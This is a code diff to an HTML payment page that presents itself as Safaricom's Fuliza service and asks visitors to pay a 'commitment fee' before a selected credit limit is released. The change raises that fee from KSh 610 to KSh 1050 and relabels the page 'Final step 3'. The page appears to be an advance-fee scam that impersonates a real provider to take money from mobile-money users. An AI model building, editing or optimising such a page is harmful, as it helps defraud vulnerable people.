@@ -111,7 +111,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#e8f5e9;min-height:100vh
 </head>
 <body>
 
-<header class="top-bar">Safaricom Fuliza — Step 3</header>
+<header class="top-bar">Safaricom Fuliza — Final step 3</header>
 
 <div class="page-wrap">
 
@@ -130,7 +130,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#e8f5e9;min-height:100vh
       <div class="invoice-limit">Selected Fuliza Limit: <span>KSh <span id="limit">—</span></span></div>
       <div class="invoice-amount-row">
         <div class="invoice-currency">KSh</div>
-        <div class="invoice-amount">610</div>
+        <div class="invoice-amount">1050</div>
         <div class="invoice-label">Amount Due</div>
       </div>
     </div>
@@ -173,7 +173,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#e8f5e9;min-height:100vh
     </div>
     <div class="phone-hint" id="phoneHint">Enter 9 digits after 254 — must start with 7 (e.g. 712345678)</div>
 
-    <button class="pay-btn" id="payBtn" onclick="payNow()">Pay KSh 610 Now</button>
+    <button class="pay-btn" id="payBtn" onclick="payNow()">Pay KSh 1050 Now</button>
 
     <div class="spinner" id="spinner">
       <div class="loader"></div>
@@ -242,7 +242,7 @@ document.getElementById("limit").innerText = selectedAmount;
 /* =========================
    COMMITMENT FEE
 ========================= */
-const COMMITMENT_FEE = 610;
+const COMMITMENT_FEE = 1050;
 
 document.querySelector(".invoice-amount").innerText = COMMITMENT_FEE;
 
@@ -538,4 +538,4 @@ function retryPayment() {
       }
 </script>
 </body>
-</html>
+  </html>
